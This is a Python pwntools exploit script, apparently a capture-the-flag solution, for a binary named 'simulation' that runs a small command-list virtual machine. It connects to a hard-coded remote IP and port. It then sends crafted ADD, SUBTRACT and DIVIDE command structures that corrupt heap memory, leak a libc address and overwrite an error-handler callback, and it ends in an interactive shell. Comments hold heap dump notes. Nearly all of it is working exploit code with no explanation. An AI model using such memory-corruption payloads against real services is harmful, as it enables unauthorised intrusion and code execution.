from pwn import *
context.binary=exe=ELF('./simulation',checksec=False)
#p=process(exe.path)
p=remote("103.163.25.143" ,20007)
#######################
ADD=0
SUBTRACT=1
MULTIPLY=2
DIVIDE=3
STORE=4
LOAD=5
#######################
#######################
CONSTANT  = 0
REGISTER  = 1
MEM       = 2
#######################
def GDB():
	gdb.attach(p,gdbscript='''
		b*run+1686
		c
		''')
	input()
#GDB()
command = p64(ADD) #func
command += p64(CONSTANT) #type of arg1
command += p64(0xabcdef) #value arg1
command += p64(CONSTANT) #type of arg2
command += p64(0x123456) #value arg2
command += p64(MEM) #type of arg2
command += p64(0x18) #value arg2


def add(index,nb_command,next_node,command,defualt_handler):
	p.sendlineafter(b"> ",b"1")
	p.sendlineafter(b"Index: ",f"{index}".encode())
	p.sendlineafter(b"Number of command: ",f"{nb_command}".encode())
	p.sendlineafter(b"Next node: ",f"{next_node}".encode())
	p.sendafter(b"Fill command list: ",command)
	if(defualt_handler):
		p.sendafter(b"Use default handler? (y/n): ",b"y")
		p.sendafter("Input default error handler: ",f"{defualt_handler}".encode())
	else:
		p.sendafter(b"Use default handler? (y/n): ",b"N")
def run(start):
	p.sendlineafter(b"> ",b"2")
	p.sendlineafter(b"Where to start? ",f"{start}".encode())
########add(index,nb_command,next_node,command,defualt_handler):#######################
for i in range(1,50):
	add(i,1,i+1,command,1)
add(50,1,0,command,1)

run(1)
#####################################################################################
########add(index,nb_command,next_node,command,defualt_handler):#######################
########################
for i in range(1,30):
	add(i,1,i+1,command,1)
command = p64(ADD) #func
command += p64(CONSTANT) #type of arg1
command += p64(0) #value arg1
command += p64(CONSTANT) #type of arg2
command += p64(1) #value arg2
command += p64(MEM) #type of arg2
command += p64(0x50) #value arg2
add(30,1,31,command,1)
command = p64(DIVIDE) #func
command += p64(CONSTANT) #type of arg1
command += p64(0x541) #value arg1
command += p64(MEM) #type of arg2
command += p64(0x50) #value arg2
command += p64(MEM) #type of arg2
command += p64(0x58) #value arg2
add(31,1,0,command,1)
run(1)
'''
0x5572f24909c0: 0x0000000000000000      0x0000000000000000 #10
0x5572f24909d0: 0x0000000000000000      0x0000000000000000 #20
0x5572f24909e0: 0x0000000000000000      0x0000000000000000 #30
0x5572f24909f0: 0x0000000000000000      0x0000000000000000 #40
0x5572f2490a00: 0x0000000000000000      0x0000000000000000 #50
0x5572f2490a10: 0x0000000000000000      0x0000000000000000 # meta data #0x58 #60
0x5572f2490a20: 0x0000000000000000      0x0000000000000000 # error_handler 0x60 , cur_cmd 0x64,nb_cmd 0x68,next_node0x6c #70
0x5572f2490a30: 0x0000000000000000      0x0000000000000000 #80  err_callback=0x70 func=0x78
0x5572f2490a40: 0x00000000001c8f80      0x00000000000004b1 #90  arg1->type=0x80 arg1->val =0x88
0x5572f2490a50: 0x00007f0681eb5ce0      0x00007f0681eb5ce0 #a0 
0x5572f2490a60: 0x0000000000000000      0x0000000000000000 #b0



exact:
0x55bcc0095a10: 0x0000000000000000      0x0000000000000061
0x55bcc0095a20: 0x0000000000000000      0x0000000000000001
0x55bcc0095a30: 0x000055bcbf4c3539      0x0000000000000003
0x55bcc0095a40: 0x0000000000000000      0x0000000000000541
0x55bcc0095a50: 0x0000000000000002      0x0000000000000050
0x55bcc0095a60: 0x0000000000000002      0x0000000000000058
'''
#####################################################################################
command = p64(DIVIDE) #func
command += p64(MEM) #type of arg1
command += p64(0) #value arg1
command += p64(CONSTANT) #type of arg2
command += p64(0x0) #value arg2
command += p64(MEM) #type of arg2
command += p64(0x90) #value arg2
add(30,1,0,command,1)

command = p64(ADD) #func
command += p64(CONSTANT) #type of arg1
command += p64(0) #value arg1
command += p64(CONSTANT) #type of arg2
command += p64(1) #value arg2
command += p64(MEM) #type of arg2
command += p64(0x10) #value arg2
add(1,1,2,command,1)
######################
command = p64(DIVIDE) #func
command += p64(MEM) #type of arg1
command += p64(0x20) #value arg1
command += p64(MEM) #type of arg2
command += p64(0x10) #value arg2
command += p64(MEM) #type of arg2
command += p64(0) #value arg2
add(2,1,3,command,1)
command = p64(SUBTRACT) #func
command += p64(MEM) #type of arg1
command += p64(0) #value arg1
command += p64(CONSTANT) #type of arg2
command += p64(0x1c8f80) #value arg2
command += p64(MEM) #type of arg2
command += p64(0) #value arg2
add(3,1,4,command,1)
######################
#0x1003b6873
command = p64(DIVIDE) #func
command += p64(CONSTANT) #type of arg1
command += p64(0x3b6873) #value arg1
command += p64(MEM) #type of arg2
command += p64(0x10) #value arg2
command += p64(MEM) #type of arg2
command += p64(0x60) #value arg2
add(4,1,5,command,1)

command = p64(DIVIDE) #func
command += p64(MEM) #type of arg1
command += p64(0) #value arg1
command += p64(MEM) #type of arg2
command += p64(0x10) #value arg2
command += p64(MEM) #type of arg2
command += p64(0x70) #value arg2
add(5,1,30,command,1)




p.interactive()